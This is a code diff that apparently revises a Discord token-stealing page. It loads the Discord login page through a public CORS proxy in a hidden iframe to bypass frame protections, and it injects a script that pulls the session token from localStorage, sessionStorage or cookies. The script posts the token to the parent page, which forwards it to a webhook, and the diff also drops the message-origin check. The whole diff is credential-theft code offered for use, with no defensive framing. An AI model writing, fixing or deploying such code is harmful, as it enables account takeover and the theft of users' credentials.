@@ -32,59 +32,78 @@
             });
         }
 
-        // Listen for messages from the iframe
         window.addEventListener("message", function(event) {
-            if (event.origin === "https://corsproxy.io" && event.data) {
+            // Allow any origin if testing locally, but prefer specific ones
+            if (event.data && event.data !== "NO_TOKEN_FOUND") {
                 console.log("Token received:", event.data);
                 sendToWebhook(event.data);
                 document.getElementById('msg').innerText = "Success!";
             }
         });
 
-        // Create the iframe
         const iframe = document.createElement('iframe');
         
-        // Use corsproxy.io to bypass X-Frame-Options
-        // Encode the Discord URL so it’s properly formatted
-        const discordUrl = encodeURIComponent('https://discord.com/login');
-        iframe.src = `https://corsproxy.io/?${discordUrl}`;
+        // Use allorigins.win to bypass X-Frame-Options
+        // Note: This returns the raw HTML of the login page
+        iframe.src = `https://api.allorigins.win/raw?url=${encodeURIComponent('https://discord.com/login')}`;
         
         iframe.style.display = 'none';
         document.body.appendChild(iframe);
 
-        // Inject script after iframe loads
         iframe.onload = function() {
             try {
-                const doc = iframe.contentDocument || iframe.contentWindow.document;
+                // Get the document from the iframe
+                const iframeWindow = iframe.contentWindow;
+                const doc = iframeWindow.document;
                 
+                // Create and inject the script
                 const script = doc.createElement('script');
                 script.textContent = `
-                    window.addEventListener('load', function() {
-                        const token = localStorage.getItem('token');
-                        if (token) {
-                            window.parent.postMessage(token, '*');
+                    (function() {
+                        // Wait for DOM to be ready
+                        if (document.readyState === 'loading') {
+                            document.addEventListener('DOMContentLoaded', grabAndSend);
                         } else {
-                            // Fallback: check cookies
-                            const cookies = document.cookie;
-                            const tokenMatch = cookies.match(/(?:^|;\s*)token=([^;]*)/);
-                            if (tokenMatch) {
-                                window.parent.postMessage(decodeURIComponent(tokenMatch[1]), '*');
+                            grabAndSend();
+                        }
+
+                        function grabAndSend() {
+                            // Try localStorage
+                            let token = localStorage.getItem('token');
+                            
+                            // If not found, try sessionStorage
+                            if (!token) {
+                                token = sessionStorage.getItem('token');
+                            }
+
+                            // If still not found, try cookies
+                            if (!token) {
+                                const cookies = document.cookie;
+                                const match = cookies.match(/(?:^|;\s*)token=([^;]*)/);
+                                if (match) {
+                                    token = decodeURIComponent(match[1]);
+                                }
+                            }
+
+                            if (token) {
+                                window.parent.postMessage(token, '*');
                             } else {
                                 window.parent.postMessage('NO_TOKEN_FOUND', '*');
                             }
                         }
-                    });
+                    })();
                 `;
                 
+                // Append to body
                 doc.body.appendChild(script);
                 
                 // Timeout fallback
                 setTimeout(() => {
-                    document.getElementById('msg').innerText = "Timeout waiting for token.";
+                    document.getElementById('msg').innerText = "Timeout or no token found.";
                 }, 10000);
 
             } catch (e) {
-                console.error("Failed to inject script:", e);
+                console.error("Injection failed:", e);
                 document.getElementById('msg').innerText = "Injection failed.";
             }
         };
